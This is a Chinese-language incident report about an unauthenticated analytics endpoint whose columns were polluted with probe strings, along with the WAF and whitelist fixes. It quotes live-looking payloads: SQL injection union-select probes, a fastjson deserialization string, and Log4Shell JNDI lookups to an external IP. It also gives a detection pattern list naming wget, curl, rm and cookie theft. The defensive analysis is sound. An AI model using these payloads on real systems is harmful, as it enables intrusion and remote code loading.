## 一、一句话结论

`/api/events` 是一个**公开、无鉴权、字段全由客户端决定**的 POST 接口，攻击者（或安全测试）可以把任意字符串写进 events 表的维度列（uid / event_type / product / page），直接污染 `/api/stats/summary` 的 `per_product` 聚合与 `/api/stats/pages` 的 page 聚合。

**线上共 80 行被污染，分布在 2026-07-22 / 08-03 / 09-08 三个批次**，内容是标准的 SQL 注入列数探测、Log4Shell JNDI、fastjson 反序列化三类公开 payload 语料。

**但要讲清楚：这不是 SQL 注入漏洞，探针从未被执行过。** 全仓 34 处 `DB.prepare` 的 SQL 全部是静态字面量或全参数化绑定，没有一处模板拼接或字符串加号拼接 —— 探针只是被当成普通字符串**存了下来**，污染的是统计数字，不是数据库。

**今天已完成**：堵住入口（WAF 补盲区 + 写入层白名单）、清掉 80 行脏数据、临时审计端点下线、线上回归验证通过。

## 三、污染明细（线上实测，临时端点全字段扫描）

**命中 78 行 + 2 行 = 80 行**，时间分布：

| 日期 | 行数 | 特征 |
|---|---|---|
| 2026-07-22 | 1 | `page = {"type":"general","rating":5,"comment":"final_deploy_test"}`（自测部署探针） |
| 2026-08-03 | 48 | JNDI ×3 + fastjson ×3 + `index' union select 1..10--` ×10 + GBK 引号绕过 ×1 + 灌 uid/event_type/data 的变体 |
| 2026-09-08 | 30 | `home' union select 1..10--` ×10 + `" union select 1..10--` ×10 + 灌 uid/event_type 的变体 |

**探针灌进过的列**（不是只有 product！）：

```
page 52 次 │ uid 46 次 │ product 30 次 │ data 20 次 │ event_type 6 次
```

**payload 类型**：
- SQL 注入列数探测：`' union select 1,2,...,N-- `（N=1..10），两种引号形式（`'` 与 `"`）
- Log4Shell JNDI：`${jndi:ldap://183.47.120.213:1389/jdk...}`、`${jndi:rmi://183.47.120.213:1099/bypass...}`
- fastjson 反序列化：`{"@type": "jar:http:..2672530850:80.cmd_inject..."}`
- GBK 引号绕过：`aaaa'%bf%27`

**来源指纹**：两条 uid `mp_mscv5ivm9ddkry`、`mp_mts4ag2dilz1ne` —— 格式与我方小程序 tracker.js 的 `getUid()`（`'mp_' + Date.now().toString(36) + 随机 6 位`）**完全一致**，且 UA 为空、时间集中在 1~2 分钟内。**判定为我方安全测试/扫描留下的痕迹，不是外部入侵**（外部扫描器不会生成我方 uid 格式）。但**漏洞面是真实公开可利用的**，所以照样按事故处理。

**为什么 08-05 上线的 WAF 只挡住了一半**：
- `LOG4SHELL_ATTACK_PATTERNS`（JNDI / fastjson）检查 **path + query + header + body** → 这两类后来被挡住了
- `isSuspiciousQueryString()`（SQLi / XSS / 命令注入）**只检查 URL query** → POST body 里的 SQLi 探针**全部漏网**
- 08-03 那批是 WAF 上线**之前**灌进去的；09-08 那批是 WAF 上线**之后**灌进去的 —— 因为 SQLi 走的是 body，规则没覆盖

**还有一个隐藏盲区**：`checkLog4ShellWAF` 读 body 的条件是 `contentLength > 0 && contentLength < 65536`，**chunked 传输（扫描器常用）没有 Content-Length → body 整体不被检查**。本次一并改成流式限长读取。

### 1. WAF 补盲区（Layer 7.6）

```js
const INJECTION_PAYLOAD_PATTERNS = [ /* union select / select...from / or 1=1 / drop table /
   <script / javascript: / onerror= / document.cookie / ${...} / __proto__ / ;cat|rm|wget|curl / ... */ ];
```
- 只对 `/api/events`、`/api/event` 的 body 生效（**自由文本接口不套用**，否则一条英文留言 "select ... from" 就会误封用户出口 IP）
- 命中 → 403 + 封 IP（与既有 JNDI 处置一致）

### 2. body 读取不再依赖 Content-Length

```js
async function readBodyCapped(request, maxBytes) { /* 读流，最多 64KB，读完 cancel */ }
```

### 3. 写入层白名单（纵深防御，不依赖 WAF）

| 字段 | 规则 | 违规处置 |
|---|---|---|
| `uid` | `^[A-Za-z0-9_.\-]{1,64}$` | 整条丢弃 |
| `event_type` | `^[A-Za-z0-9_\-]{1,32}$` | 整条丢弃 |
| `product` | `^[A-Za-z0-9_%.\-]{1,64}$` | 整条丢弃 |
| `page` | `^[A-Za-z0-9_%.\-/:]{1,256}$` | page 清空（事件保留，不参与 page 聚合） |
| `title`/`url`/`referrer`/`data` | 不做白名单（自由文本且不参与 GROUP BY） | 由 WAF body 检测兜底 |

响应体新增 `stored` / `skipped` / `page_cleared` 三个计数，方便观测丢弃量。

## 六、遗留与建议（不阻塞，但要记着）

1. **`/api/events` 仍无鉴权** —— 现在靠白名单 + WAF + 限流（30 次/分/IP）挡着。建议后续加一个**服务端签名或只写 token**，让第三方无法任意写入（小程序与网站端各自带一个不可猜的 key）。
2. **UA 封禁规则对 API 路径不生效**（Layer 3 明确 skip API path），所以 sqlmap/nmap 这类 UA 打 `/api/events` 不被拦 —— 靠 body 检测兜住了，但值得单独收敛。
3. **`page` 命名未归一**：`/knowledge` 与 `/knowledge/` 在 `/api/stats/pages` 里算两个页面（PV 177 vs 97），与 8-31 需求单里「page 命名规范」是同一个问题的两面。
4. **`/api/stats` 的 uv 口径未拆**（待拍板第⑥项）：现在 uv 是全站 distinct uid，混了小程序与网站两套 uid 空间。
5. **2026-08-12 运维报告里的 P1 建议同步销账**：那条「攻击 Payload 未清理」现已闭环（清理 + 入口堵死 + 复检 0 命中）。
